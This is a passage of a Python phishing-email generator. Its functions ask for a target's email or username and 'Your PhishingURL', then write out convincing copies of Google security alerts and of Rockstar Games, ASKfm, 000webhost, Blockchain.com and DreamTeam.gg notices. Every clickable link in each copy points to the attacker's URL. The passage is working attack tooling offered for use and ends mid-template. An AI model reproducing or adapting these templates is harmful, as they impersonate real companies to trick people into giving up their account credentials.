								<table style="margin:0 auto;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:0px;padding-bottom:0px;padding-left:0;padding-right:0">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="width:100%;text-align:center">
													   <img alt="Header" src="https://i.postimg.cc/nc7Pr5XH/top-_LOL1.png" style="width:100%;height:auto" width="600" align="middle">
													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#ffffff;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:45px;padding-bottom:15px;padding-left:50px;padding-right:50px">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="padding:0 0 0">
														<div style="margin-right:auto;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#444444;font-size:16px;line-height:1.3;max-width:600px;text-align:justify">What's up {},



																<br><br>We noticed that you haven’t been on DreamTeam.gg in the last two weeks. We can only assume you are somewhere on a beach relaxing.
																<br><br>Otherwise, we are starting to get nervous.
																<br><a target="_blank" style="color:#0077cc" href="{}">Log in</a> and <b>let us know everything is ok!</b>

														</div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#ffffff;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:15px;padding-left:30px;padding-right:30px">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td>
														<table style="margin:0 auto" cellspacing="0" cellpadding="0" border="0">
															<tbody><tr>
																<td> <a target="_blank" href="{}" style="display:table-cell;text-decoration:none;padding:12px 25px;font-size:17px;text-align:center;font-weight:bold;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;width:100%;color:#ffffff;border:0px solid;background-color:#041f3f;border-radius:100px"> LOG IN </a> </td>

															</tr>

														</tbody></table>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#ffffff;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:45px;padding-left:50px;padding-right:50px">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="padding:0 0 0">
														<div style="margin-right:auto;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#444444;font-size:16px;line-height:1.3;max-width:600px;text-align:justify">GL HF!

														</div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#0e2846;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:0px;padding-bottom:0px;padding-left:0;padding-right:0">
											<table style="width:100%" valign="top" width="100%" cellspacing="0" cellpadding="0" border="0">

												<tbody><tr>
													<td></td>

													<td style="height:2px;width:600px;background-color:#00ccff" height="2px"></td>

													<td></td>

												</tr>

												<tr>
													<td></td>

													<td style="height:15px;width:600px"></td>

													<td></td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#0f2745;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:30px;padding-left:50px;padding-right:50px">
											<table width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="text-align:left">
														<div style="margin-right:auto;font-weight:normal;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#ffffff;font-size:14px;line-height:1.3;max-width:600px">© 2019 DreamTeam. All rights reserved.
															<br> You are receiveing this email because you opted in at our website.
															<br>
														</div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#16253d;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:30px;padding-left:50px;padding-right:50px">
											<table style="width:100%" valign="top" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="text-align:center;padding:0 0 0">
														<div style="margin-right:auto;font-weight:normal;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#444444;font-size:14px;line-height:1.3;max-width:600px;padding-bottom:10px">DreamTeam, 2454 Centennial Towers, Suite 205C, West Bay Road, West Bay, Grand Cayman, KY1-1303, Cayman Islands

														</div>

														<div style="margin:0 auto;font-weight:normal;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#8c8c8c;font-size:14px;line-height:1.3;max-width:350px"><a target="_blank" style="color:#0077cc!important;text-decoration:none;border-bottom:1px solid #0077cc" href="">Unsubscribe</a></div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>


				</td>

			</tr>

		</tbody></table>


	<img style="display:block;width:1px!important;min-width:1px!important;max-width:1px!important;height:1px!important;border:0;overflow:hidden" src="https://dreamteam21599.emlnk1.com/lt.php?nl=2&amp;c=202&amp;m=340&amp;s=ed8fa103941dbfb0cd8442bbd9a8c886&amp;l=open" width="1" height="1" border="0"><br clear="all"></div>


	</div></div>""".format(username, url, url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(dream)
	Html_file.close()
	print(alert + " HTML File Created")
	
def GmailActivity():
	email = input(start + " Enter Target Email: ")
	url = input(start + " Enter Your PhishingURL: ")
	
	sourcecode = ("""
	<div style="margin: 0; padding: 0;"><img src="https://notifications.googleapis.com/email/t/AFG8qyX1N_r29I45LMotMWsye64za9dbvJiyZgdgizAGJw1L7gbGf8c45Hpsrd2cJlaFZnZCfo8rbM6s1bJe91QnxNeUB2v7DpR9BJkQ6RScy8EfVFqaQS1DG_fW9CnrF2NMvgM9Caq7MczU-jDToF4iWHKayK4ji5x1qf6LozELELyhyTmFDalDEplYkEtbUM6dJF3HqWcsLqmQq4TrbbFtGcoIg-wEc76Skkq59dys8PX_Cm5T12R7I-hcd9jLZaukEASj_0r_0GkmpfRp-ulF7yvIuE7Z5O4stFo/a.gif" width="1" height="1" />
	<table lang="en" style="min-width: 348px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr style="height: 32px;">
	<td>&nbsp;</td>
	</tr>
	<tr align="center">
	<td>
	<div>&nbsp;</div>
	<table style="padding-bottom: 20px; max-width: 516px; min-width: 220px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 8px;" width="8">&nbsp;</td>
	<td>
	<div style="border-radius: 8px; padding: 40px 20px; border: thin solid #dadce0;" align="center"><img style="margin-bottom: 16px;" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
	<div style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; border-bottom: thin solid #dadce0; color: rgba(0,0,0,0.87); line-height: 32px; padding-bottom: 24px; text-align: center; word-break: break-word;">
	<div style="text-align: center; padding-bottom: 16px; line-height: 0;"><img src="https://www.gstatic.com/images/icons/material/system/2x/error_red_36dp.png" height="33" /></div>
	<div style="font-size: 24px;">Sign-in attempt was&nbsp;blocked</div>
	<table style="margin-top: 8px;" align="center">
	<tbody>
	<tr style="line-height: normal;">
	<td style="padding-right: 8px;" align="right"><img style="width: 20px; height: 20px; vertical-align: sub; border-radius: 50%;" src="https://www.gstatic.com/accountalerts/email/anonymous_profile_photo.png" alt="" width="20" height="20" /></td>
	<td><a style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.87); font-size: 14px; line-height: 20px;">{}</a></td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 14px; color: rgba(0,0,0,0.87); line-height: 20px; padding-top: 20px; text-align: left;">Someone just used your password to try to sign in to your account from a non-Google app. Google blocked them, but you should check what happened. Review your account activity to make sure no one else has access.
	<div style="padding-top: 32px; text-align: center;"><a style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; line-height: 16px; color: #ffffff; font-weight: 400; text-decoration: none; font-size: 14px; display: inline-block; padding: 10px 24px; background-color: #d94235; border-radius: 5px; min-width: 90px;" href="{}" target="_blank" rel="noopener">Check activity</a></div>
	</div>
	</div>
	<div style="text-align: left;">
	<div style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">
	<div>You received this email to let you know about important changes to your Google Account and services.</div>
	<div style="direction: ltr;">&copy; 2021 Google LLC, <a style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a></div>
	</div>
	</div>
	</td>
	<td style="width: 8px;" width="8">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="height: 32px;">
	<td>&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</div>""".format(email, url))

	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(sourcecode)
	Html_file.close()
	print(alert + " HTML File Created")


def Rockstar():
	username = input(start + " Enter Target Gamertag (Username): ")
	url = input(start + " Enter Your PhishingURL: ")
	
	sourcecode = ("""
		<div bgcolor="#fcfcfc" style="width:100%!important;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0;padding-top:0;padding-right:0;padding-bottom:40px;padding-left:0;background:#fcfcfc">
			<center>

				<table style="font-size:14px;font-family:arial;color:#000000;margin:0 auto;border-left:1px solid #e7e7e7;border-right:1px solid #e7e7e7;background-color:#fcfcfc;border-spacing:0;max-width:628px;min-width:300px;width:100%;text-align:center;line-height:1.4" width="628" cellspacing="0" cellpadding="0">
					<tbody>

					<tr style="background-color:#000000">
						<th colspan="3">
							<img alt="Rockstar Games Social Club logo" src="http://media.rockstargames.com/sc/images/emailtemplate/GIf/SC/SC_Mobile.gif">
						</th>
					</tr>

					<tr>
						<td>
						</td>
						<td><img alt src="http://media.rockstargames.com/sc/images/emailtemplate/blank.gif" height="64" border="0"></td>
						<td>
						</td>
					</tr>

					<tr>
						<td></td>
						<td><table style="font-size:14px;font-family:arial;color:#000000;margin:0 auto;background-color:#fcfcfc;border-spacing:0;max-width:628px;min-width:300px;width:100%;text-align:center;line-height:1.4">
		<tbody><tr><td>
			<h1 style="font-size:22px;font-weight:bold">
				Your Social Club account has been linked
			</h1>
		</td></tr>

		<tr>
			<td>
				<img alt src="http://media.rockstargames.com/sc/images/emailtemplate/blank.gif" width="1" height="20" border="0">
			</td>
		</tr>

		<tr>
			<td>
				<p>
					Your Social Club account has been successfully linked to your gamertag: {}
				</p>
			</td>
		</tr>
	</tbody></table></td>
						<td></td>
					</tr>

					<tr>
						<td></td>
						<td><img alt src="http://media.rockstargames.com/sc/images/emailtemplate/blank.gif" width="1" height="34" border="0"></td>
						<td></td>
					</tr>

					<tr>
						<td></td>
						<td style="border-top:1px solid #e7e7e7"><img alt src="http://media.rockstargames.com/sc/images/emailtemplate/blank.gif" width="1" height="30" border="0"></td>
						<td></td>
					</tr>

					<tr>
						<td></td>
						<td>
							<p>
								<a target="_blank" href="{}" style="color:#ffab00">
									socialclub.rockstargames.com
								</a>
							</p>
						</td>
						<td></td>
					</tr>

					<tr>
						<td></td>
						<td><img alt src="http://media.rockstargames.com/sc/images/emailtemplate/blank.gif" width="1" height="40" border="0"></td>
						<td></td>
					</tr>

					<tr>
						<td></td>
						<td><p style="color:#b7b7b7;font-size:12px">This administrative email is being sent to you from Rockstar Games, 622 Broadway, NY, NY 10012. If you want the early word on all Rockstar game announcements, official launches, contests, special events, and more <a target="_blank" href="{}" style="color:#ffab00">subscribe to the Rockstar Games Mailing List</a>.</p></td>
						<td></td>
					</tr>

				   <tr>
						<td></td>
						<td><img alt src="http://media.rockstargames.com/sc/images/emailtemplate/blank.gif" width="1" height="80" border="0"></td>
						<td></td>
					</tr>
				</tbody></table>

			<img src="http://www.google-analytics.com/collect?v=1&amp;tid=UA-15984839-42&amp;cid=153279409&amp;uid=153279409&amp;t=event&amp;ec=Email&amp;ea=AccountLinked2_xbl_Open&amp;el=153279409&amp;cs=Social%20Club&amp;cm=Email&amp;cn=Administrative%20Emails">
			</center>
		</div>
	</div></div>""".format(username, url, url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(sourcecode)
	Html_file.close()
	print(alert + " HTML File Created")


def AskFm():
	username = input(start + " Enter Target Username: ")
	Url = input(start + " Enter Your PhishingURL: ")
	
	source = ("""
	<div style="background-color:#f2f3f7">

	<table style="padding:0;width:100%;font-family:Verdana,Tahoma,Arial,Helvetica,sans-serif;font-size:14px" cellspacing="0" cellpadding="0">
		<tbody>
		<tr>
			<td style="background-color:#fff;border-bottom:8px solid #f2f3f7;height:55px;padding:0px 10px 0px;color:#fff;font-weight:bold;text-align:center">
				<img alt="ASKfm" style="border:none;vertical-align:middle" src="https://ask.fm/images/welcomeLogo-160.png">
			</td>
		</tr>
		<tr>
			<td style="background-color:#fff;border:1px solid #fff;padding:20px">
				<b>We have received your request to recover your account information on ASKfm.</b>
				<p>
				  Your Username Is: {}
				</p>
				<p>
				Press the link to reset your password:
					<a target="_blank" style="color:#3081a3" href="{}">Reset password</a>
				</p>
			</td>
		</tr>
		<tr>
			<td style="padding-left:20px;padding-right:20px;padding-top:0px;padding-bottom:0px;background-color:#f2f3f7;text-align:center">
				<p style="font-size:11px;color:#898989">
				In social networks: <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">ASKfm</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">Twitter</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">Facebook</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">Instagram</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">VK</a>
				</p>
			</td>
		</tr>
		</tbody>
	</table>

	</div>
	</div></div>
	""".format(username, Url, Url, Url, Url, Url, Url))
	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

	
def Webhost000():
	Url = input(start + " Enter Your PhishingURL: ")
	
	source = ("""
	<div bgcolor="#FFFFFF" style="padding:0;margin:0;width:100%!important;background-color:#ffffff">
		<table width="100%" cellspacing="0" cellpadding="30" border="0">
			<tbody><tr>
				<td bgcolor="#eeeeee" align="center">
					<table style="border-radius:6px" width="660" cellspacing="0" cellpadding="0" border="0" bgcolor="#FFFFFF" align="center">
						<tbody><tr>
							<td style="border-radius:5px">

								<table width="600" cellspacing="0" cellpadding="0" border="0" bgcolor="#FFFFFF" align="center">
									<tbody><tr>
										<td style="padding:40px 0" align="center">
											<img style="width:150px" alt="000Webhost.com" src="https://cdn.000webhost.com/000webhost/logo/000logo-new-colors.png" border="0">
										</td>
									</tr>
								</tbody></table>
								<table width="600" cellspacing="0" cellpadding="0" border="0" bgcolor="#FFFFFF" align="center">
									<tbody><tr>
										<td style="padding-bottom:60px;font-size:14px;font-family:Helvetica,Arial,Verdana sans-serif" align="center">
											<div>
												<p style="margin:0px;font-size:14px;font-family:Helvetica,Arial,Verdana sans-serif">
	</p><table width="560" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="color:#32454c;font-family:Helvetica,Arial,Verdana sans-serif" align="center">
				<p style="font-size:42px;line-height:1.25;margin:0"><b>Website limit reached</b></p>
				<p style="font-size:14px;line-height:1.71;margin:20px 0 40px 0">You just reached your limit of 2 allowed websites. Upgrade to premium to increase your limits</p>
			</td>
		</tr>

		<tr>
			<td style="color:#ff5c62;font-size:14px;line-height:20px" align="center">

					<a target="_blank" style="font-family:Verdana;background-color:#ff5c62;border-radius:3px;color:#ffffff;display:inline-block;font-size:14px;line-height:50px;text-align:center;text-decoration:none;width:220px" rel="noopener noreferrer" href="{}"><b>Upgrade To Premium</b></a>

			</td>
		</tr>
	</tbody></table>
	<table width="540" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="color:#32454c;font-family:Helvetica,Arial,Verdana sans-serif;padding-top:20px;margin-top:20px" align="center">
				<p style="font-size:22px;line-height:1.5"><b>What you can do to increase the limit</b></p>
				<p style="font-size:14px;line-height:1.71;color:#6f7c81;padding-top:20px">Step 1: Delete one of your current websites that you aren’t using anymore directly from your website settings.</p>
			</td>
		</tr>
	</tbody></table>
	<table width="540" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>

			<td style="padding:10px 0 40px 0">

				<img alt="Create an app header image" src="https://cdn.000webhost.com/000webhost/email/website-limit-reached-email-img-1.png">

			</td>
		</tr>
	</tbody></table>
	<table width="560" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="color:#32454c;font-family:Helvetica,Arial,Verdana sans-serif" align="center">
				<p style="font-size:14px;line-height:1.71;color:#6f7c81">Step 2: Write and share a public review about 000webhost to increase your limit to 3 websites absolutely free</p>
			</td>
		</tr>
	</tbody></table>
	<table width="540" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="padding:10px 0 20px 0">

				<img alt="Create an app header image" src="https://cdn.000webhost.com/000webhost/email/website-limit-reached-email-img-2.png">

			</td>
		</tr>
	</tbody></table>
	<table width="560" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="color:#32454c;font-family:Helvetica,Arial,Verdana sans-serif;padding-top:60px" align="center">
				<p style="font-size:24px;line-height:1.33"><b>Did you know?</b></p>
				<p style="font-size:14px;line-height:1.71;margin:20px 0 40px 0">000webhost was built by the Hostinger team mostly for learning purposes. Upgrading to Hostinger will unlock all the best
	features together with more power and fastest speed. Migrate to premium in a matter of seconds.</p>
			</td>
		</tr>

		<tr>
			<td style="color:#ff5c62;font-size:14px;line-height:20px" align="center">

				<a target="_blank" style="font-family:Verdana;background-color:#ff5c62;border-radius:3px;color:#ffffff;display:inline-block;font-size:14px;line-height:50px;text-align:center;text-decoration:none;width:220px" rel="noopener noreferrer" href="{}"><b>Upgrade To Premium</b></a>

				</td>
			</tr>
	</tbody></table><p></p>
											</div>
										</td>
									</tr>
								</tbody></table>
								<hr style="border:1px solid #ededed">
								<table width="600" cellspacing="0" cellpadding="0" border="0" bgcolor="#FFFFFF" align="center">
									<tbody><tr>
										<td style="padding:60px 0" align="center">
											<table cellspacing="0" cellpadding="0" border="0" align="center">
												<tbody><tr>
													<td style="padding-bottom:10px" align="center">
														<a target="_blank" style="padding:0 5px" href="{}"><img alt="Facebook icon" src="https://cdn.000webhost.com/000webhost/icons/email_icons/facebook.png" width="24" height="24"></a>
														<a target="_blank" style="padding:0 5px" href="{}"><img alt="Instagram icon" src="https://cdn.000webhost.com/000webhost/icons/email_icons/instagram.png" width="24" height="24"></a>
														<a target="_blank" style="padding:0 5px" href="{}"><img alt="Twitter icon" src="https://cdn.000webhost.com/000webhost/icons/email_icons/twitter.png" width="24" height="24"></a>
													</td>
												</tr>
												<tr>
													<td style="font-size:14px;font-family:Helvetica,Arial,sans-serif;line-height:20px" align="center">
														<a target="_blank" href="{}" style="color:#ff5c62;padding:0 5px">Login</a>
														<a target="_blank" href="{}" style="color:#ff5c62;padding:0 5px">Tutorials</a>
														<a target="_blank" href="{}" style="color:#ff5c62;padding:0 5px">FAQ</a>
														<a target="_blank" href="{}" style="color:#ff5c62;padding:0 5px">Upgrade</a>
													</td>
												</tr>
												<tr>
													<td style="font-size:14px;font-family:Helvetica,Arial,sans-serif;line-height:20px;color:#32454c" align="center">
														<p style="margin:10px 0">@ Hostinger, Inc. All rights reserved.</p>
														<a target="_blank" href="{}" style="color:#ff5c62">Unsubscribe</a>
													</td>
												</tr>
											</tbody></table>
										</td>
									</tr>
								</tbody></table>
							</td>
						</tr>
					</tbody></table>
			<img src="https://mailer.000webhost.com/o/166701908/784b8456b197cfa3739105108b37f6e2/5058" alt="pixel"></td></tr></tbody></table></div>
	</div></div>""".format(Url, Url, Url, Url, Url, Url, Url, Url, Url, Url))
	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

def Blockchain():
	Url = input(start + " Enter Your PhishingURL: ")
	
	source = ("""
	<div style="color: transparent; visibility: hidden; opacity: 0; font-size: 0px; border: 0; max-height: 1px; width: 1px; margin: 0px; padding: 0px; border-width: 0px!important; display: none!important; line-height: 0px!important;"><img src="http://go.sparkpostmail2.com/q/Q7tsiXTRYQG7SEDvizET-g~~/AAP1OAA~/RgRgcaotPVcDc3BjQgoAKi0lj17Xt8P6UhViaXprZW5AcHJvdG9ubWFpbC5jb21YBAAAAAA~" width="1" height="1" border="0" /></div>
	<p><span style="color: transparent; visibility: hidden; display: none; opacity: 0; height: 0; width: 0; font-size: 0;">Whether for filing taxes or simply for your own records, you can now download your transaction history as a CSV.</span><img style="border: 0; width: 1px; height: 1px; border-width: 0px!important; display: none!important; line-height: 0!important;" src="http://links.blockchain.com/e/eo?_t=b077a02c6d894ec28e56236cee81e43a&amp;_m=72a52e96a6a74b70850eec468ada1374&amp;_e=lPfbQA3SIQ7hISMt9H7G0NypCD_6FLhliEbdOmCO-NGLfXR96pBl4HW95MZyyhoFNTSOLnZ64-9Y7onhzSmdiYIf5ODjBxJxT_TJHbaJfmtbBTPuu72vhqYHjTOpp16nkYlWwSXv2acjsrpbF-WBySlSokSBpK4pqxCMPho__FA%3D" width="1" height="1" /></p>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; padding: 12px; background-color: #ffffff;">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 12px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; padding-bottom: 20px; padding-top: 15px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: middle; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: middle; padding: 0;" valign="middle">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse; border-spacing: 0px;" role="presentation" border="0" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 200px;" width="200"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; line-height: 100%; -ms-interpolation-mode: bicubic; border: 0; display: block; outline: none; text-decoration: none; height: auto; width: 100%; font-size: 13px;" src="https://www.blockchain.com/static/img/email/com-blue-logo@2x.png" alt="blockchain.com wallet logo" width="275" height="auto" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #ffffff; background-color: #ffffff; margin: 0px auto; border-radius: 12px; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #ffffff; background-color: #ffffff; width: 100%; border-radius: 12px;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; padding-bottom: 32px; padding-left: 40px; padding-right: 40px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
